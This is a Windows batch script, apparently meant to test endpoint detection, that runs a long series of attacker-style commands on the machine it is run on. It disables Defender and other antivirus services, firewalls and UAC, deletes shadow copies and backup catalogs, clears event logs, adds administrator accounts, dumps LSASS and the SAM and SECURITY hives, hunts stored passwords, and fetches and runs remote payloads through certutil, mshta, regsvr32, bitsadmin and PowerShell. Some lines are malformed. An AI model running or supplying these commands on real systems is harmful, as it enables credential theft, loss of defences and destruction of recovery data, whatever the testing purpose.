@ECHO OFF 
:: This batch file wants to check your EDR systems detection and response capabilities in a more noisy way!
TITLE EDR TESTER Runnig Now!!!!!
ECHO ============================
systeminfo | findstr /c:"OS Name" >> c:\testEDR.txt
systeminfo | findstr /c:"OS Version" >> c:\testEDR.txt
systeminfo | findstr /c:"System Type" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
systeminfo | findstr /c:"Total Physical Memory" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic cpu get name >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO NETWORK INFO >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ipconfig | findstr IPv4 >> c:\testEDR.txt
ipconfig | findstr IPv6 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ipconfig | findstr /R /C:"IP.*" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user Administrator /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
echo %USERNAME% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net Accounts  >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup administrators >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net use >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net share >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group "Enterprise Admins" /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup administrators /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup administrators apice /add
ECHO ============================ >> c:\testEDR.txt
net localgroup "Remote Desktop Users" apice  /add >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup "Debugger users" apice /add >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup "Power users" apice /add >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group “Domain Controllers” /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group “Domain Admins” /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user johnwick /domain /active:no >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net config workstation >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net accounts >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net continue >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
NET STOP Spooler >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net.exe view igmp.mcast.net >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group "domain computers" /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net time >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
NET START Spooler >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ping -n 10 127.0.0.1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net config Workstation >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net statistics Workstation >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net accounts /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net view >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net stop windefend >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
sc stop SepMasterService & sc stop Windefend & sc stop xagt & sc stop CarbonBlack & sc stop mcshield & sc stop msmpsvc & sc stop wuauserv >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user admin apice /add >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user admin /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user admin /active:yes /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ver >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tree /F /A >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
assoc >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
assoc | findstr ".xml" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
schtasks /create /sc minute /mo 1 /tn VVRsPMjDDQ_1.exe /tr C:\Users\user\AppData\Local\Temp\VVRsPMjDDQ_1.exe
ECHO ============================ >> c:\testEDR.txt
schtasks /query /fo csv /v > %TEMP% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
assoc | find ".exe" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
schtasks /query /fo LIST /v >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
REG ADD HKEY_CURRENT_USER\Console /v Test /d "Test Data" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
REG QUERY HKEY_CURRENT_USER\Console /v Test >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
REG DELETE HKEY_CURRENT_USER\Console /v Test /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
REG QUERY HKEY_CURRENT_USER\Console /v Test >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic computersystem LIST full >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cls >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKLM /f password /t REG_SZ /s >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg query HKCU /f password /t REG_SZ /s >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
findstr /snip password *.xml *.ini *.txt >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /s *password* == *cred* == *vnc* == *.config* >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir c:\*vnc.ini /s /b >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
fsutil fsinfo drives >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
bcdedit /set {current} bootstatuspolicy ignoreallfailures >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
bcdedit /set {default} recoveryenabled No -y >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tasklist /svc >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic /namespace:\\root\securitycenter2 path antivirusproduct >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic path Win32_PnPdevice >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic qfe list brief >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic startup list brief >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic share list >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic service get name,displayname,pathname,startmode >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic process list brief >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic process get caption,executablepath,commandline  >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C whoami >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ipconfig /all >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C powershell exit >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ping -n 10 google.com.tr >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic process call create "cmd.exe /C calc.exe" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic computersystem get "Model","Manufacturer", "Name", "UserName" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic shadowcopy delete -y >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic UserAccount where Name='apice' set PasswordExpires=False >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
route print >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
query session >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh advfirewall show allprofiles >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh firewall show config >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tasklist >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
arp -a >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
systeminfo  >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
qwinsta >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ipconfig /displaydns & ipconfig /flushdns >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
quser >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wevtutil cl application >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wevtutil cl system >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wevtutil cl security >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
taskkill /F /IM iexplore.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
taskkill /F /IM calc.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
taskkill /f /pid 8888 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nltest /domain_trusts >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
sc config "windefend" start= disabled >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
sc config upnphost obj= ".\LocalSystem" password= "" >> c:\testEDR.txt
ECHO ============================
"schtasks" /Create /TR "CSIDL_PROFILE\appdata\roaming\adobe\adobeup.exe" /SC WEEKLY /TN "Adobe Acrobat Reader Updater" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
psexec.exe -s -i -d regedit >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
psexec.exe -u administrator -p password \\servertest.abc.local -h -s -d -accepteula cmd.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
psexec.exe -i -s cmd.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
"powershell.exe" get-process | where {$_.Description -like "*$windefend*"} >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
"powershell.exe" get-process | where {$_.Description -like "*$cylance*"} >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/refs/heads/master/Archive-Old-Version/OSBinaries/Payload/Mshta_calc.sct").Exec();close(); >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe -EncodedCommand Zm9yKCR4ID0gMTA7ICR4IC1sdCAxMjA7ICR4Kz0xMCkgeyBbU3lzdGVtLkNvbnNvbGVdOjpCZWVwKCR4LCAzKTsgIiR4IEh6In0 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /s >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
takeown /F test.bat >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
taskkill.exe /f /fi "imagename eq repmgr64.exe" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /ah >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir "C:\Program Files" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO %PATH% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netstat -ano >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netstat -ano | findstr "ESTABLISHED" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh firewall set opmode disable >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh.exe firewall set opmode mode=disable profile=all >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
driverquery >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net user admin /delete >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ipconfig /all >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
whoami >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
whoami /groups >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
sc query state=all >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ipconfig /all >> %temp%\download >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
date /T & time /T >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nbtstat -n >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nbtstat -s >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net view  \\127.0.0.1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
hostname >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmdkey /list >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group "REDACTED" /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net group “Exchange Trusted Subsystem” /domain >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh interface show >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh firewall show state >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
getmac >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
set shellobj = wscript.createobject("wscript.shell") >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
echo Set objWshShell = WScript.CreateObject^(“WScript.Shell”^) >> “%temp%\win.vbs” >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tasklist /v >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netstat -an | findstr LISTENING >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
findstr /S cpassword $env:logonserver\sysvol\*.xml >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
findstr /S cpassword %logonserver%\sysvol\*.xml >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net localgroup "Administrators" rdm /add >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh wlan export profile folder=. key=clear >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh advfirewall set currentprofile state off >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO  %date%-%time% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
vssadmin delete shadows /For=C: /oldest >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
vssadmin.exe delete shadows /all /quiet >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
whoami /upn & whoami /fqdn & whoami /logonid & whoami /user & whoami /groups & whoami /priv & whoami /all >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
svchost.exe -k DcomLaunch >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
svchost.exe -k netsvcs -p -s Schedule >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
svchost.exe -k netsvcs >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
forfiles /S /P C:\ /m *.sys /d -10 /c "cmd /c echo @PATH" >> c:\testEDR.txt
ECHO ============================
forfiles /S /P C:\ /m *.hive /d -10 /c "cmd /c echo @PATH" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /s /b /A:D | findstr "pass" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe Invoke-WebRequest http://www.pdf995.com/samples/pdf.pdf -UserAgent $userAgent >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic.exe os get /format:"http://blah/foo.xsl" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe (Invoke-WebRequest -uri "https://api.ipify.org/").Content >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe Test-NetConnection -ComputerName google.com -port 443 -InformationLevel detailed >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c winrm quickconfig -quiet > nul 2>&1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c winrm set winrm/config/Client @{AllowUnencrypted = “true”} > nul 2>&1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe Set-Item WSMan:localhost\client\trustedhosts -value * -Force > nul 2>&1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
del *sys* & del *hive* >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wbadmin delete catalog -quiet >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ping -n 10 127.0.0.1 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net use \\srvtest.abc.local\ipc$ >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
net use \\10.38.1.35\C$ /delete >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /s /b /A:H | findstr "pass" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nslookup bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tracert -d bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nslookup www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
timeout 4 >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
tasklist /m >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
taskkill.exe /f /im Microsoft.Exchange.\* >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO %logonserver% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cd C:\Users\Default\AppData\Local >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
mkdir Vrtrfetmntest.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
mkdir k:\windows\system32\fr-FR >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
copy %systemroot%\system32\taskkill.exe k:\windows\system32\csrss.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic /node:host process call create “echo > C:\windows\perfc” >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
icacls "C:\windows" /grant Administrator:F /T >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cd "C:/Documents and settings\administrator\userdata" & dir >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nslookup whatismyip.com >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
nltest /dclist:abc.local >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://alvarezborja.com/jashebc5ujpsed/podkjfnvb3sidje", "$env:APPDATApole.scr" );Start-Process( "$env:APPDATApole.scr" ) >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
start C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1');Invoke-BloodHound" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
subst k: %temp% >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
"powershell.exe" -nop -c "import-module applocker; get-command *applocker* >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg save HKLM\Security security.hive >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg save HKLM\System system.hive >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
reg save HKLM\SAM sam.hive >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
ren cmd.exe utilman.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic /node:localhost process call create “cmd.exe /c notepad” >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
runas.exe /netonly /user:abc\johnwick dsa.msc >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
start /b cmd /c dir /b /s \\nas\users_home_share$ ^ >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir \\abc.local\sysvol\*.xml /a-d /s >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmd.exe /c bitsadmin /transfer TW /priority foreground https://example.com/apt.exe %USERPROFILE%\apt.exe && start %USERPROFILE%\apt.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
powershell $b = $env:temp + '\RJklmtiTre.exe';WGet 'http://testsite/apt.exe' -outFiLe $b;start $b >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
gpresult /z >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
gpresult /r | find "OU" >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
gpresult /H gpreport.html >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c: >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
cmstp.exe /ni /s https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/refs/heads/master/Archive-Old-Version/OSBinaries/Payload/Cmstp.inf  >> c:\testEDR.txt    
ECHO ============================ >> c:\testEDR.txt
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);} >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
msiexec /q /i http://192.168.100.3/tmp/cmd.png >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
secedit /export /cfg secpolicy.inf /areas USER_RIGHTS >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
winword.exe http://bcdyzitklmnprti.onion/payload.exe >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh winhttp set proxy "proxy.hacked.com:8080"; 127.0.0.1,localhost >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
wmic useraccount where name='krbtgt' get name,fullname,sid >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh advfirewall firewall set rule group=”Windows Remote Management” new enable=yes >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
netsh winhttp reset proxy >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
lsadump:dcsync /domain:abc.local /user:ktbtgt >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
setspn -L servertest >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
setspn -L abc.local\johnwick >> c:\testEDR.txt
ECHO ============================ >> c:\testEDR.txt
